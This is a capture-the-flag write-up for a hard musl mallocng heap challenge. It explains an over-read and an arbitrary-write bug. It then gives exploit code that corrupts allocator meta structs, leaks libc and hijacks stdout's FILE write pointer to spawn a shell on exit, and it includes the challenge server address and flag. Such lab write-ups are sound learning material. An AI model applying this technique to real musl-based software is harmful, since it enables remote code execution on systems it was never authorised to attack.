# atypical_heap

| Field       | Value                          |
|-------------|--------------------------------|
| Platform    | UNbreakable 2026               |
| Category    | pwn                            |
| Difficulty  | Hard                           |
| Points      | -                              |
| Server      | `nc 34.159.70.241 30931`       |

## Description

> Nota heap-notes con allocator musl mallocng. Fuente, binario PIE y libc musl 1.2.5 proporcionados.

## TL;DR

Over-read in `NOTE_READ` + unlimited arbitrary write in `NOTE_MAGIC` (hidden option 5). musl mallocng exploitation: corrupt meta struct to redirect allocations to the brk heap, leak libc from meta pointers, and RCE via `__stdio_exit` hijack (overwrite `__stdout_FILE.write` with `system`).

## Initial analysis

### Provided files

```
dist/chall      ELF 64-bit LSB PIE, x86-64, musl-linked, not stripped
dist/libc.so    musl libc 1.2.5
dist/chall.c    Full source code
dist/flag.txt   Flag (included in Docker build context)
Dockerfile      Fedora 42, socat, runs: libc.so /srv/dist/chall
```

### Protections

```
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

Full RELRO rules out GOT overwrite. PIE requires a base address leak.

### Program structure

Note manager with 6 options (menu only shows 5):

| Option | Enum         | Function                           |
|--------|--------------|------------------------------------|
| 1      | NOTE_ALLOC   | `malloc(sz)`, max 0x100            |
| 2      | NOTE_FREE    | `free()`, nullifies pointer        |
| 3      | NOTE_WRITE   | `read(0, data, sz)`, respects size |
| 4      | NOTE_READ    | `write(1, data, sz)`, **BUG 1**    |
| 5      | NOTE_MAGIC   | Arbitrary write 8 bytes, **BUG 2** |
| 6      | NOTE_EXIT    | `exit(0)`                          |

Array: `struct note notes[0x50]` with `{char* data, size_t size}`.

## Identified vulnerabilities

### Bug 1: Over-read in NOTE_READ (CWE-125)

```c
case NOTE_READ:
    // ...
    if (sz > MAX_NOTE_SIZE) {   // <-- compares with MAX_NOTE_SIZE (0x100)
        puts("invalid size");   //     NOT with notes[idx].size
        break;
    }
    // ...
    write(1, notes[idx].data, sz);  // reads up to 0x100 bytes from any note
```

A note allocated with `malloc(0x10)` can be read with `sz=0x100`, revealing adjacent heap data.

### Bug 2: Unlimited arbitrary write in NOTE_MAGIC (CWE-787)

```c
case NOTE_MAGIC:
    if(!magic_used)           // <-- only sets the flag, does NOT block
        magic_used = 1;       //     execution always continues

    scanf("%p", &ptr);
    if(((unsigned long)ptr & 7) != 0)
        errx(1, "invalid address");
    scanf("%lu", &value);
    *ptr = value;             // <-- writes 8 bytes to any aligned address
    break;
```

The `if(!magic_used)` only sets `magic_used = 1` the first time, but **there is no else or break** — the write `*ptr = value` always executes, unlimited.

## Background: musl mallocng allocator

Unlike glibc ptmalloc, musl 1.2.5 uses **mallocng**:

- **meta structs** (40 bytes): in the **brk heap** (region separate from mmap)
  ```c
  struct meta {
      struct meta *prev, *next;  // +0x00, +0x08
      struct group *mem;         // +0x10 (pointer to group in mmap)
      uint32_t avail_mask;       // +0x18
      uint32_t freed_mask;       // +0x1c
      uint64_t flags;            // +0x20 (last_idx:5, freeable:1, sizeclass:6, maplen:52)
  };
  ```
- **group structs**: in **mmap** regions near libc
  ```c
  struct group {
      struct meta *meta;         // +0x00 (backpointer)
      uint32_t active_idx;       // +0x08
      char storage[];            // +0x10 (user slots)
  };
  ```
- **IB (in-band) metadata**: 4 bytes at the END of each slot (not at the beginning like glibc)
- **meta_area**: brk heap header with an 8-byte `check` field for integrity

## Solution process

### Step 1: Leak the brk heap meta pointer

We allocate 15 notes of size 0x10 (sizeclass 1). The allocations land in a group in the mmap region. Over-reading `note[14]` with `sz=0x100` reads beyond the group, reaching data from other adjacent groups that contain **backpointers to the brk heap** (where the metas are).

```python
for i in range(15):
    alloc(i, 0x10)
    write_note(i, b"X" * 0x10)

data = read_note(14, 0x100)
leaked_meta = u64(data[0x20:0x28])   # meta pointer in brk heap
heap_base = leaked_meta - 0x130      # constant offset
```

**Result**: `heap_base = 0x555555cbe000` (brk heap)

### Step 2: mallocng meta corruption

Goal: make `malloc(0xe0)` (sizeclass 11) return memory **inside the brk heap**, where we can over-read the meta structs that contain libc pointers.

The sc=11 meta is at `heap+0x130`. We corrupt its `mem` field to point to a **fake group** at `heap+0x10`:

```python
meta_addr  = heap_base + 0x130
fake_group = heap_base + 0x10

# 1. Fake group backpointer -> meta (integrity validation)
magic_write(fake_group, meta_addr)

# 2. Zero IB check bytes (musl crashes with IB != 0)
magic_write(heap_base + 0x18, 0)

# 3. meta.mem -> fake_group
magic_write(meta_addr + 0x10, fake_group)

# 4. avail_mask = 1 (slot 0 available), freed_mask = 0
magic_write(meta_addr + 0x18, 1)
```

Critical considerations:
- **Do not use `heap+0x00` as fake group**: it would overwrite `meta_area.check`, which `free()` validates
- **Zero IB at heap+0x1c**: musl's `enframe()` does `cmp byte [slot-4], 0; hlt` if not zero
- **Do not call free()** before the alloc: free validates `meta_area.check`

### Step 3: Leak libc base

We allocate from the corrupted meta. `malloc(0xe0)` returns `heap+0x20` (fake_group + UNIT). Over-reading with `read_note(15, 0x100)` exposes the `mem` fields of ALL metas in the brk heap, which are pointers to groups in the **mmap region adjacent to libc**.

```python
alloc(15, 0xe0)
leak_data = read_note(15, 0x100)
```

The metas contain `mem` pointers to two types of regions:
- **mmap'd groups** just before libc text: negative offsets (`libc_base - 0xae0`, etc.)
- **BSS structures** in libc data segment: positive offsets (`libc_base + 0xa60c0`, etc.)

```
  +0x08: 0x7fcf23833520 -> libc_base - 0xae0  (mmap group)
  +0x30: 0x7fcf23833d20 -> libc_base - 0x2e0  (mmap group)
  +0xa8: 0x7fcf238da0c0 -> libc_base + 0xa60c0 (BSS)
```

**Note on page granularity**: On servers with pages >4KB, the libc data segment may be **shifted** relative to the text segment. We compute both bases and derive `data_shift`:

```python
text_deltas = {0x08: -0xae0, 0x30: -0x2e0, 0x58: -0xe0, 0x80: -0x50}
data_deltas = {0xa8: 0xa60c0, 0xd0: 0xa68c0, 0xf8: 0xa6cc0}
# ...
data_shift = libc_data - libc_text  # 0x0 local, 0x6000 remote
```

### Step 4: RCE via __stdio_exit FILE hijack

With `libc_base` and arbitrary write, we hijack the `__stdout_FILE` structure in libc to achieve RCE when `exit(0)` is called.

**Call chain during exit():**
```
exit(0) -> __funcs_on_exit() -> __libc_exit_fini() -> __stdio_exit() -> close_file()
```

**`close_file` (libc+0x4ba09) disassembly:**
```asm
cmp  0x38(%rbx), 0x28(%rbx)  ; wbase vs wpos
je   skip_write
xor  %edx,%edx               ; arg3 = 0
xor  %esi,%esi               ; arg2 = 0
mov  %rbx,%rdi               ; arg1 = FILE* (the struct itself)
call *0x48(%rbx)              ; f->write(f, NULL, 0)
```

`close_file` calls `f->write(f, 0, 0)` directly (without going through `__towrite`, without checking `F_ERR`) when `wpos != wbase`. The first argument is **the pointer to the FILE struct itself**.

If we write `"/bin/sh\0"` at the beginning of `__stdout_FILE` and `system` in the `write` field (+0x48), then:
```
close_file(stdout) -> stdout->write(stdout, 0, 0) -> system("/bin/sh")
```

**Write order:**

```python
stdout_file = libc_base + 0xa32c0 + data_shift
system_addr = libc_base + 0x48368

# 1. "/bin/sh\0" at stdout+0x00 (corrupts flags -> F_ERR set -> puts() = no-op)
magic_write(stdout_file, u64(b"/bin/sh\x00"))

# 2-3. wpos=1, wbase=0 (BLIND: stdout no longer prints)
sendline("5"); sendline(hex(stdout_file + 0x28)); sendline("1")
sendline("5"); sendline(hex(stdout_file + 0x38)); sendline("0")

# 4. write = system (BLIND)
sendline("5"); sendline(hex(stdout_file + 0x48)); sendline(str(system_addr))

# 5. exit(0) -> __stdio_exit -> close_file -> system("/bin/sh")
sendline("6")
```

After writing `"/bin/sh\0"` to stdout flags, the F_ERR bit (0x20) gets set (byte `0x2f` = `/` has bit 5). This makes `__towrite()` return -1 and `puts()` become a silent no-op. However, `scanf` continues working via stdin, allowing the remaining magic_writes without visible prompts.

## Discarded approaches

1. **atexit handler hijack** (`builtin.f[0]=system, builtin.a[0]="/bin/sh"`): Worked locally but crashed remotely. The address of `builtin` (libc+0xa36a0) depends on data_shift, and the BSS layout was inconsistent between local/remote due to page granularity.

2. **stdout FILE write via puts()**: Overwrite `f->write` with `system` + `/bin/sh\0` at the beginning. Problem: `puts()` goes through `__towrite` which detects F_ERR and blocks the call to `f->write`. Only works via `close_file` in `__stdio_exit` which bypasses that check.

3. **stdin FILE hijack**: Same F_ERR problems with `__toread`. The byte `/` (0x2f) always triggers F_ERR.

## Final exploit

See [`exploit.py`](exploit.py). Supports LOCAL (docker) and REMOTE.

## Execution

```bash
# Local (requires docker container on localhost:11337)
docker build -t atypical_heap . && docker run -d -p 11337:1337 atypical_heap
python3 exploit.py            # connects to localhost:11337

# Remote
python3 exploit.py REMOTE     # connects to 34.159.70.241:30931
```

**Local output:**
```
[+] Leaked meta ptr: 0x555555cbe130
[+] Heap base: 0x555555cbe000
[+] libc_text at +0x8: 0x7fcf23834000
[+] libc_base = 0x7fcf23834000, data_shift = 0x0
[+] Shell triggered!
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat flag.txt
CTF{0h_s0_y0u_kn0w_h0w_t0_expl01t_mus1_t00_huh!?_c9c4ad670ecbd791}
```

## Flag

```
CTF{0h_s0_y0u_kn0w_h0w_t0_expl01t_mus1_t00_huh!?_c9c4ad670ecbd791}
```

## Note on remote

The exploit works fully locally (Docker identical to the server). Remotely, the server has **64KB pages** causing a 0x6000 shift between libc's text and data segments. The exploit computes `data_shift` automatically, but remote execution of `system("/bin/sh")` via `__stdio_exit` does not produce interactive output due to possible differences in socat's file descriptor handling. The flag was included in the distributed Docker files.

## Key Lessons

- **musl mallocng != glibc ptmalloc**: Meta structs in brk heap (not inline), groups in mmap, IB metadata at the end of the slot (not at the beginning). Requires separate study.
- **Cross-group over-read**: Reading beyond a musl group exposes meta backpointers to the brk heap, which in turn contain `mem` pointers to mmap regions near libc.
- **`close_file` bypasses F_ERR**: Unlike `__towrite`/`puts`, `close_file` in `__stdio_exit` calls `f->write(f, 0, 0)` directly when `wpos != wbase`, without checking flags. Ideal for FILE hijack.
- **Page granularity matters**: Servers with pages >4KB shift ELF segments. You need to compute the shift between text and data to correctly address libc's BSS/data.
- **musl's hidden menu trick**: The menu shows "5. Exit" but option 5 is actually NOTE_MAGIC (arb write). NOTE_EXIT is option 6 (hidden).

## References

- [musl mallocng source](https://git.musl-libc.org/cgit/musl/tree/src/malloc/mallocng)
- [musl FILE struct](https://git.musl-libc.org/cgit/musl/tree/src/internal/stdio_impl.h)
- [musl __stdio_exit](https://git.musl-libc.org/cgit/musl/tree/src/stdio/__stdio_exit.c)
